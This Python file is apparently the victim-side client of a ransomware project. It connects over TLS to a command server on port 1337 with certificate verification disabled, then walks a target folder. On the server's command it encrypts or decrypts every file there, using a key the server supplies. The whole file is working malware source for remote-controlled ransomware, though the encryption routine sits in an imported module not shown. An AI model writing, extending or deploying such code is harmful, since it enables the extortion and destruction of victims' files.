import os
import ssl
import json
import socket
from Trojan_Ransomware import RansomwareClient



def create_client(ip, port):
    '''
    Creating a client socket (victim's socket).
    '''
    # Creating a foundation for building a secure server application in Python that can communicate via TLS/SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    # Disabling hostname and certificate verification
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    # Creates a socket object for the client
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create TCP Socket object
    connection = socket.create_connection((ip, port))
    # Converts a regular, unsecured socket connection to an SSLSocket object
    tls_conn = context.wrap_socket(connection, server_hostname = ip)
    print(f"[+] Connected to server {ip}:{port}")
    return tls_conn


def find_files_in_folder(folder_path):
    '''
    Saving the paths of all files in a given folder.
    '''
    files_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            files_list.append(os.path.join(root, file))
    return files_list


def ransomware_execution(folder_path):
    '''
    The function receives the packet from the server, converts it into a dictionary and performs
    the operation according to what was sent from the server (according to the button clicked in the interface).
    '''

    while True:
        # Receiving the packet from the server
        data = client_sock.recv(4096).decode('utf-8')

        # If no data was received
        if not data:
            break

        try:
            # Converting a string to a dictionary with JSON
            data = json.loads(data)

        except json.JSONDecodeError:
            print("Received invalid JSON")
            continue

        # Defining variables for dictionary values
        action = data.get('action')
        secret_key = data.get('secret_key')

        # Creating an object of the RansomwareClient class
        ransomware = RansomwareClient(secret_key)

        # Finding the paths of all files in a folder
        files = find_files_in_folder(folder_path)

        # If the action pressed by the server is encryption
        if action == "encrypt":
            for file in files:
                ransomware.encrypt_file(file)
            client_sock.sendall("Encryption completed".encode('utf-8'))

        # If the action pressed by the server is decryption
        elif action == "decrypt":
            for file in files:
                ransomware.decrypt_file(file)
            client_sock.sendall("Decryption completed".encode('utf-8'))
        
        # If somehow another action was sent
        else:
            print("Unknown action:", action)



if __name__ == "__main__":

    # Creating a client socket
    client_sock = create_client(os.getenv("PrivateIP"), 1337)
    # Setting the path of the target folder
    folder_path = 'd://Users//user//Pictures//test'
    # Running the function that manages the client's work
    ransomware_execution(folder_path)